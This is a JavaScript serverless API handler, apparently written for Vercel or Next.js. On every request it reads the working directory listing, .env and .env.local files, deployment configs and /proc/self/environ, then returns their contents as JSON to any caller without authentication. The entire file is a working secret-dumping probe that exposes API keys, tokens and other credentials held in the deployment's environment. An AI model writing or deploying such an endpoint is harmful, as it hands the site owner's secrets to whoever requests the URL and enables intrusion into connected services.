export default async function handler(req, res) {
  const fs = require('fs');
  const results = {};
  
  try {
    // Check what's in the current working directory
    results.cwd = process.cwd();
    results.cwd_contents = fs.readdirSync('.');
    
    // Look for common serverless/container config files
    const configFiles = [
      'package.json',
      '.env',
      '.env.local', 
      'vercel.json',
      'now.json',
      '/proc/self/environ'
    ];
    
    for (const file of configFiles) {
      try {
        if (fs.existsSync(file)) {
          results[`file_${file.replace(/[/.]/g, '_')}`] = fs.readFileSync(file, 'utf8');
        }
      } catch (error) {
        results[`file_${file.replace(/[/.]/g, '_')}_error`] = error.message;
      }
    }
    
  } catch (error) {
    results.fs_error = error.message;
  }
  
  return res.json(results);
}
